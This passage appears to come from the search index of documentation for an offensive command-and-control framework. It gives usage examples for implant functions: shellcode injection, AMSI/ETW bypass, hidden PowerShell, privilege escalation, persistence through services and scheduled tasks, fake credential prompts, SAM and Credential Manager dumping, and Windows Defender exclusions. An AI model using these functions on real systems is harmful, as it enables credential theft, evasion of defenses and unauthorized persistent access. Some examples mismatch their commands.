<pre><code>inline_exe(active(),\"gogo.exe\",{\"-i\",\"127.0.0.1\"},true,60,\"\",\"\"))\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#inline_local","title":"inline_local","text":"<p>Execute inline PE on implant process</p> <p>Execute inline PE on implant process, support spoofing process arguments</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>args</code> [table] -  arguments <li><code>output</code> [boolean] - </li> <li><code>process</code> [string] - </li> <p>Example</p> <pre><code>inline_local(active(),{\"\"},true,\"whoami\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#inline_shellcode","title":"inline_shellcode","text":"<p>Executes the given inline shellcode in the implant process</p> <p>The current shellcode injection method uses APC.</p> <p>\"instability warning!!!</p> <p>inline execute shellcode may cause the implant to crash, please use with caution.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] - </li> <li><code>args</code> [table] -  <li><code>output</code> [boolean] - </li> <li><code>timeout</code> [number] - </li> <li><code>arch</code> [string] - </li> <li><code>process</code> [string] - </li> <p>Example</p> <pre><code>inline_shellcode(active(),\"/path/to/shellcode\",{},true,60,\"x64\",\"\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#powerpick","title":"powerpick","text":"<p>unmanaged powershell on implant process (Windows Only)</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  powershell script</li> <li><code>powershell</code> [table] -  powershell cmdline <li><code>param</code> [any] -  bypass amsi,etw,wldp</li> <p>Example</p> <pre><code>powerpick(active(),\"powerview.ps1\",{\"\"},new_bypass_all()))\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#powershell","title":"powershell","text":"<p>Execute cmd with powershell</p> <p>equal: powershell.exe -ExecutionPolicy Bypass -w hidden -nop \"[cmdline]\"</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] - </li> <li><code>cmd</code> [string] - </li> <li><code>output</code> [boolean] - </li> </ul> <p>Example</p> <pre><code>powershell(active(),\"dir\",true))\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#shell","title":"shell","text":"<p>Execute cmd</p> <p>equal: exec cmd /c \"[cmdline]\"</p> <p>Arguments</p> <ul> <li><code>sessions</code> [Session] - </li> <li><code>cmd</code> [string] - </li> <li><code>output</code> [boolean] - </li> </ul> <p>Example</p> <pre><code>shell(active(),\"whoami\",true)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#file","title":"file","text":""},{"location":"IoM/manual/mal/builtin/#cat","title":"cat","text":"<p>Print file content</p> <p>concatenate and display the contents of file in implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>fileName</code> [string] -  file to print</li> </ul> <p>Example</p> <pre><code>cat(active(),\"file.txt\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#cd","title":"cd","text":"<p>Change directory</p> <p>change the shell's current working directory in implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  path to change directory</li> </ul> <p>Example</p> <pre><code>cd(active(),\"path\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#chmod","title":"chmod","text":"<p>Change file mode</p> <p>change the permissions of files and directories in implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  file to change mode</li> <li><code>mode</code> [string] -  mode to change</li> </ul> <p>Example</p> <pre><code>chmod(active(),\"file.txt\",\"644\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#chown","title":"chown","text":"<p>Change file owner</p> <p>change the ownership of a file or directory in implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  file to change owner</li> <li><code>uid</code> [string] -  user to change</li> <li><code>gid</code> [string] -  group to change</li> <li><code>recursive</code> [boolean] -  recursive</li> </ul> <p>Example</p> <pre><code>chown(active(),\"file.txt\",\"username\",\"groupname\",true)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#cp","title":"cp","text":"<p>Copy file</p> <p>copy files and directories in implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>originPath</code> [string] -  origin path</li> <li><code>targetPath</code> [string] -  target path</li> </ul> <p>Example</p> <pre><code>cp(active(),\"source\",\"target\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#download","title":"download","text":"<p>Download file</p> <p>download file in implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  file path</li> </ul> <p>Example</p> <pre><code>download(active(),`file.txt`)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#ls","title":"ls","text":"<p>List directory</p> <p>list directory contents in implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  path to list files</li> </ul> <p>Example</p> <pre><code>ls(active(),\"/tmp\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#mkdir","title":"mkdir","text":"<p>Make directory</p> <p>make directories in implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  dir</li> </ul> <p>Example</p> <pre><code>mkdir(active(),\"/tmp\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#mv","title":"mv","text":"<p>Move file</p> <p>move files and directories in implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>sourcePath</code> [string] -  source path</li> <li><code>targetPath</code> [string] -  target path</li> </ul> <p>Example</p> <pre><code>mv(active(),\"/tmp/file1.txt\",\"/tmp/file2.txt\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#pipe_read","title":"pipe_read","text":"<p>Read data from a named pipe</p> <p>Read data from a specified named pipe.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  name of the pipe</li> </ul> <p>Example</p> <pre><code>pipe_read(active(), \"pipe_name\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#pipe_upload","title":"pipe_upload","text":"<p>Upload file to a named pipe</p> <p>Upload the content of a specified file to a named pipe.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>pipe</code> [string] -  target pipe</li> <li><code>path</code> [string] -  file path to upload</li> </ul> <p>Example</p> <pre><code>pipe_upload(active(), \"pipe_name\", \"file_path\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#pwd","title":"pwd","text":"<p>Print working directory</p> <p>print working directory in implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> </ul> <p>Example</p> <pre><code>pwd(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#rm","title":"rm","text":"<p>Remove file</p> <p>remove files and directories in implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>fileName</code> [string] -  file to remove</li> </ul> <p>Example</p> <pre><code>pwd(active(),\"/tmp/file.txt\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#upload","title":"upload","text":"<p>Upload file to a named pipe</p> <p>Upload the content of a specified file to a named pipe.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  source path</li> <li><code>target</code> [string] -  target path</li> <li><code>priv</code> [string] - </li> <li><code>hidden</code> [boolean] - </li> </ul> <p>Example</p> <pre><code>upload(active(),\"/source/path\",\"/target/path\",parse_octal(\"644\"),false)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#implant","title":"implant","text":""},{"location":"IoM/manual/mal/builtin/#cancel_task","title":"cancel_task","text":"<p>Cancel a task by task_id</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] - special session</li> <li><code>task_id</code> [number] - task id</li> </ul> <p>Example</p> <pre><code>cancel_task &lt;task_id&gt;\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#clear","title":"clear","text":"<p>Clear modules</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> </ul> <p>Example</p> <pre><code>clear(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#list_task","title":"list_task","text":"<p>List all tasks</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] - special session</li> </ul> <p>Example</p> <pre><code>list_task\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#load_module","title":"load_module","text":"<p>Load module</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>bundle_name</code> [string] -  bundle name</li> <li><code>path</code> [string] -  path to the module file</li> </ul> <p>Example</p> <pre><code>load_module(active(),\"bundle_name\",\"module_file.dll\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#query_task","title":"query_task","text":"<p>Query a task by task_id</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] - special session</li> <li><code>task_id</code> [number] - task id</li> </ul> <p>Example</p> <pre><code>query_task &lt;task_id&gt;\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#refresh_module","title":"refresh_module","text":"<p>Refresh module</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> </ul> <p>Example</p> <pre><code>refresh_module(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#sleep","title":"sleep","text":"<p>change implant sleep config</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] - special session</li> <li><code>interval</code> [number] - time interval, in seconds</li> <li><code>jitter</code> [number] - jitter, percentage of interval</li> </ul> <p>Example</p> <pre><code>sleep(active(), 10, 0.5)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#suicide","title":"suicide","text":"<p>kill implant</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] - special session</li> </ul> <p>Example</p> <pre><code>suicide(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#listener","title":"listener","text":""},{"location":"IoM/manual/mal/builtin/#webcontent_add","title":"webcontent_add","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> <li><code>$2</code> [string] - </li> <li><code>$3</code> [string] - </li> <li><code>$4</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#webcontent_remove","title":"webcontent_remove","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#webcontent_update","title":"webcontent_update","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> <li><code>$2</code> [string] - </li> <li><code>$3</code> [string] - </li> <li><code>$4</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#website_new","title":"website_new","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> <li><code>$2</code> [string] - </li> <li><code>$3</code> [string] - </li> <li><code>$4</code> [number] - </li> <li><code>$5</code> [boolean] - </li> <li><code>$6</code> [string] - </li> <li><code>$7</code> [string] - </li> <li><code>$8</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#website_start","title":"website_start","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#website_stop","title":"website_stop","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#pivot","title":"pivot","text":""},{"location":"IoM/manual/mal/builtin/#rem_dial","title":"rem_dial","text":"<p>Run rem on the implant</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>pipeline</code> [string] -  pipeline name</li> <li><code>args</code> [table] -  command args <p>Example</p> <pre><code>rem_dial(active(),\"pipeline1\",{\"-p\",\"1080\"})\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#sys","title":"sys","text":""},{"location":"IoM/manual/mal/builtin/#bypass","title":"bypass","text":"<p>Bypass AMSI and ETW</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] -  special session</li> <li><code>bypass_amsi</code> [boolean] -  bypass amsi</li> <li><code>bypass_etw</code> [boolean] -  bypass etw</li> </ul> <p>Example</p> <pre><code>bypass(active(), true, true)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#env","title":"env","text":"<p>List environment variables</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] - special session</li> </ul> <p>Example</p> <pre><code>env(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#env_set","title":"env_set","text":"<p>Set environment variable</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] - special session</li> <li><code>envName</code> [string] - env name</li> <li><code>value</code> [string] - env value</li> </ul> <p>Example</p> <pre><code>env(active(), \"name\", \"value\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#env_unset","title":"env_unset","text":"<p>Unset environment variable</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] - special session</li> <li><code>envName</code> [string] - env name</li> </ul> <p>Example</p> <pre><code>unsetenv(active(), \"envName\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#getsystem","title":"getsystem","text":"<p>Attempt to elevate privileges</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> </ul> <p>Example</p> <pre><code>getsystem(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#kill","title":"kill","text":"<p>Kill the process by pid</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>pid</code> [string] -  process id</li> </ul> <p>Example</p> <pre><code>kill(active(),pid)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#netstat","title":"netstat","text":"<p>List network connections</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] -  special session</li> </ul> <p>Example</p> <pre><code>netstat(active)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#privs","title":"privs","text":"<p>List available privileges</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> </ul> <p>Example</p> <pre><code>privs(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#ps","title":"ps","text":"<p>List processes</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] - special session</li> </ul> <p>Example</p> <pre><code>ps(active)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#reg_add","title":"reg_add","text":"<p>Add or modify a registry key</p> <p>Add or modify a registry key with specified values. Supported types: REG_SZ, REG_BINARY, REG_DWORD, REG_QWORD</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>hive</code> [string] -  registry hive</li> <li><code>path</code> [string] -  registry path</li> <li><code>valueName</code> [string] -  value name</li> <li><code>valueType</code> [string] -  value type (REG_SZ, REG_BINARY, REG_DWORD, REG_QWORD)</li> <li><code>data</code> [string] -  value data</li> </ul> <p>Example</p> <pre><code>reg_add(active(),\"HKEY_LOCAL_MACHINE\",\"SOFTWARE\\Example\",\"TestValue\",\"REG_DWORD\",\"1\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#reg_delete","title":"reg_delete","text":"<p>Delete a registry key</p> <p>Remove a specific registry key.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>hive</code> [string] -  registry hive</li> <li><code>path</code> [string] -  registry path</li> <li><code>key</code> [string] -  registry key</li> </ul> <p>Example</p> <pre><code>reg_delete(active(),\"HKEY_LOCAL_MACHINE\",\"SOFTWARE\\Example\",\"TestKey\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#reg_list_key","title":"reg_list_key","text":"<p>List subkeys in a registry path</p> <p>Retrieve a list of all subkeys under a specified registry path.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>hive</code> [string] -  registry hive</li> <li><code>path</code> [string] -  registry path</li> </ul> <p>Example</p> <pre><code>reg_list_key(active(),\"HKEY_LOCAL_MACHINE\",\"SOFTWARE\\Example\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#reg_query","title":"reg_query","text":"<p>Query a registry key</p> <p>Retrieve the value associated with a specific registry key.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>hive</code> [string] -  registry hive</li> <li><code>path</code> [string] -  registry path</li> <li><code>key</code> [string] -  registry</li> </ul> <p>Example</p> <pre><code>reg_query(active(),\"HKEY_LOCAL_MACHINE\",\"SOFTWARE\\Example\",\"TestKey\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#rev2self","title":"rev2self","text":"<p>Revert to the original token</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> </ul> <p>Example</p> <pre><code>rev2self(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#runas","title":"runas","text":"<p>Run a program as another user</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>username</code> [string] - </li> <li><code>domain</code> [string] - </li> <li><code>password</code> [string] - </li> <li><code>program</code> [string] - </li> <li><code>args</code> [string] - </li> <li><code>use profile</code> [boolean] - </li> <li><code>use env</code> [boolean] - </li> <li><code>netonly</code> [boolean] - </li> </ul> <p>Example</p> <pre><code>runas(active(),\"admin\",\"EXAMPLE\",\"password123\",\"/path/to/program\",\"arg1 arg2\",0,false)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#service_create","title":"service_create","text":"<p>Create a new service</p> <p>Create a new service with specified name, display name, executable path, start type, error control, and account name.</p> <p>Control the start type and error control by providing appropriate values.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  service name</li> <li><code>displayName</code> [string] -  display name</li> <li><code>executablePath</code> [string] -  executable path</li> <li><code>startType</code> [string] -  start type</li> <li><code>errorControl</code> [string] -  error control</li> <li><code>accountName</code> [string] -  account name</li> </ul> <p>Example</p> <pre><code>service_create(active(), \"service_name\", \"display\", \"path\", 0, 0, \"account\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#service_delete","title":"service_delete","text":"<p>Delete a specified service</p> <p>Delete a service by specifying its name, removing it from the system permanently.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  service name</li> </ul> <p>Example</p> <pre><code>service_delete(active(),\"service_name\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#service_list","title":"service_list","text":"<p>List all available services</p> <p>Retrieve and display a list of all services available on the system, including their configuration and current status.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> </ul> <p>Example</p> <pre><code>service_list(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#service_query","title":"service_query","text":"<p>Query the status of a service</p> <p>Retrieve the current status and configuration of a specified service.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  service name</li> </ul> <p>Example</p> <pre><code>service_query(active(),\"service_name\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#service_start","title":"service_start","text":"<p>Start an existing service</p> <p>Start a service by specifying its name.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  service name</li> </ul> <p>Example</p> <pre><code>service_start(active(),\"service_name\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#service_stop","title":"service_stop","text":"<p>Stop a running service</p> <p>Stop a service by specifying its name. This command will halt the service's operation.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  service name</li> </ul> <p>Example</p> <pre><code>service_stop(active(),\"service_name\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#sysinfo","title":"sysinfo","text":"<p>Get basic sys info</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] -  special session</li> </ul> <p>Example</p> <pre><code>sysinfo(active)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#taskschd_create","title":"taskschd_create","text":"<p>Create a new scheduled task</p> <p>Create a new scheduled task with the specified name, executable path, trigger type, and start boundary.</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] -  special session</li> <li><code>name</code> [string] -  name of the scheduled task</li> <li><code>path</code> [string] -  path to the executable for the scheduled task</li> <li><code>triggerType</code> [string] -  trigger type for the task</li> <li><code>startBoundary</code> [string] -  start boundary for the scheduled task</li> </ul> <p>Example</p> <pre><code>taskschd_create(active(), \"task_name\", \"process_path\", 1, \"2023-10-10T09:00:00\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#taskschd_delete","title":"taskschd_delete","text":"<p>Delete a scheduled task</p> <p>Delete a scheduled task by specifying its name.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  name of the scheduled task</li> </ul> <p>Example</p> <pre><code>taskschd_delete(active(), \"task_name\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#taskschd_list","title":"taskschd_list","text":"<p>List all scheduled tasks</p> <p>Retrieve a list of all scheduled tasks on the system.</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] -  special session</li> </ul> <p>Example</p> <pre><code>taskschd_list(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#taskschd_query","title":"taskschd_query","text":"<p>Query the configuration of a scheduled task</p> <p>Retrieve the current configuration, status, and timing information of a specified scheduled task by name.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  name of the scheduled task</li> </ul> <p>Example</p> <pre><code>taskschd_query(active(), \"task_name\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#taskschd_run","title":"taskschd_run","text":"<p>Run a scheduled task immediately</p> <p>Execute a scheduled task immediately by specifying its name.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  name of the scheduled task</li> </ul> <p>Example</p> <pre><code>taskschd_run(active(), \"task_name\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#taskschd_start","title":"taskschd_start","text":"<p>Start a scheduled task</p> <p>Start a scheduled task by specifying its name.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  name of the scheduled task</li> </ul> <p>Example</p> <pre><code>taskschd_create(active(), \"task_name\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#taskschd_stop","title":"taskschd_stop","text":"<p>Stop a running scheduled task</p> <p>Stop a scheduled task by specifying its name.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  name of the scheduled task</li> </ul> <p>Example</p> <pre><code>taskschd_stop(active(), \"task_name\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#whoami","title":"whoami","text":"<p>Print current user</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] -  special session</li> </ul> <p>Example</p> <pre><code>whoami(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#wmi_execute","title":"wmi_execute","text":"<p>Execute a WMI method</p> <p>Executes a specified method within a WMI class, allowing for more complex administrative actions via WMI.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>namespace</code> [string] -  WMI namespace</li> <li><code>className</code> [string] -  WMI class name</li> <li><code>methodName</code> [string] -  WMI method name</li> <li><code>params</code> [any] -  WMI method parameters</li> </ul> <p>Example</p> <pre><code>wmi_execute(active(), \"root\\\\cimv2\", \"Win32_Process\", \"Create\", {\"CommandLine\":\"cmd.exe\"})\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#wmi_query","title":"wmi_query","text":"<p>Perform a WMI query</p> <p>Executes a WMI query within the specified namespace to retrieve system information or perform administrative actions.</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] -  special session</li> <li><code>namespace</code> [string] -  WMI namespace</li> <li><code>args</code> [table] -  WMI query arguments <p>Example</p> <pre><code>wmi_query(active(), \"root\\\\cimv2\", {\"SELECT * FROM Win32_OperatingSystem\"})\n</code></pre>"},{"location":"IoM/manual/mal/embed/","title":"embed","text":""},{"location":"IoM/manual/mal/embed/#community","title":"community","text":""},{"location":"IoM/manual/mal/embed/#askcreds","title":"askcreds","text":"<p>Prompt for credentials</p> <pre><code>askcreds [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n      --note string          note to display (default \"Please verify your Windows user credentials to proceed\")\n  -f, --output_file string   output file\n      --prompt string        prompt to display (default \"Restore Network Connection\")\n      --wait_time int        password to dump credentials for (default 30)\n</code></pre>"},{"location":"IoM/manual/mal/embed/#autologon","title":"autologon","text":"<p>Dump the autologon credentials</p> <pre><code>autologon [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#credman","title":"credman","text":"<p>Dump the Credential Manager credentials</p> <pre><code>credman [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#curl","title":"curl","text":"<p>HTTP client tool  [options] <pre><code>curl [flags]\n</code></pre> <p>Options</p> <pre><code>      --body string          request body\n      --disable-output       disable output display\n      --header string        custom header\n  -h, --help                 print help\n      --host string          target host\n      --method string        HTTP method (GET, POST, PUT, PATCH, DELETE) (default \"GET\")\n      --noproxy              disable proxy usage\n  -f, --output_file string   output file\n      --port int             target port\n      --useragent string     custom user agent\n</code></pre>"},{"location":"IoM/manual/mal/embed/#dir","title":"dir","text":"<p>List directory contents [path]</p> <pre><code>dir [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n      --path string          directory path to list\n      --subdirs              include subdirectories (optional)\n</code></pre>"},{"location":"IoM/manual/mal/embed/#dump_sam","title":"dump_sam","text":"<p>Dump the SAM, SECURITY and SYSTEM registries [location]</p> <pre><code>dump_sam [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n      --location string      folder to save (optional) (default \"C:\\\\Windows\\\\Temp\\\\\")\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#dump_wifi","title":"dump_wifi","text":""},{"location":"IoM/manual/mal/embed/#enum","title":"enum","text":"<p>SEE ALSO</p> <ul> <li>enum arp  - Enum ARP table</li> <li>enum dc    - Enumerate domain information using Active Directory Domain Services</li> <li>enum dns  - Enum DNS configuration</li> <li>enum dotnet_process    - Find processes that most likely have .NET loaded.</li> <li>enum drives    - Enumerate system drives</li> <li>enum files  - Enumerate files   [keyword] <li>enum localcert  - Enumerate local certificates  <li>enum localsessions  - Enumerate local user sessions</li>"},{"location":"IoM/manual/mal/embed/#enum-arp","title":"enum arp","text":"<p>Enum ARP table</p> <pre><code>enum arp [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>enum  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#enum-dc","title":"enum dc","text":"<p>Enumerate domain information using Active Directory Domain Services</p> <pre><code>enum dc [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>enum  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#enum-dns","title":"enum dns","text":"<p>Enum DNS configuration</p> <pre><code>enum dns [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>enum  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#enum-dotnet_process","title":"enum dotnet_process","text":"<p>Find processes that most likely have .NET loaded.</p> <pre><code>enum dotnet_process [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>enum  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#enum-drives","title":"enum drives","text":"<p>Enumerate system drives</p> <pre><code>enum drives [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>enum  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#enum-files","title":"enum files","text":"<p>Enumerate files   [keyword] <pre><code>enum files [flags]\n</code></pre> <p>Options</p> <pre><code>      --directory string     directory path to search\n  -h, --help                 print help\n      --keyword string       optional keyword filter\n  -f, --output_file string   output file\n      --pattern string       search pattern (e.g., *.txt)\n</code></pre> <p>SEE ALSO</p> <ul> <li>enum  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#enum-localcert","title":"enum localcert","text":"<p>Enumerate local certificates  <pre><code>enum localcert [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n      --store string         certificate store name\n</code></pre> <p>SEE ALSO</p> <ul> <li>enum  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#enum-localsessions","title":"enum localsessions","text":"<p>Enumerate local user sessions</p> <pre><code>enum localsessions [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>enum  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#exclusion","title":"exclusion","text":"<p>SEE ALSO</p> <ul> <li>exclusion add    - Add Windows Defender exclusion  <li>exclusion delete  - Delete Windows Defender exclusion  <li>exclusion enum  - Enumerate Windows Defender exclusions</li>"},{"location":"IoM/manual/mal/embed/#exclusion-add","title":"exclusion add","text":"<p>Add Windows Defender exclusion  <pre><code>exclusion add [flags]\n</code></pre> <p>Options</p> <pre><code>      --data string          exclusion data\n  -h, --help                 print help\n  -f, --output_file string   output file\n      --type string          exclusion type (path, process, extension)\n</code></pre> <p>SEE ALSO</p> <ul> <li>exclusion    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#exclusion-delete","title":"exclusion delete","text":"<p>Delete Windows Defender exclusion  <pre><code>exclusion delete [flags]\n</code></pre> <p>Options</p> <pre><code>      --data string          exclusion data\n  -h, --help                 print help\n  -f, --output_file string   output file\n      --type string          exclusion type (path, process, extension)\n</code></pre> <p>SEE ALSO</p> <ul> <li>exclusion    - </li> 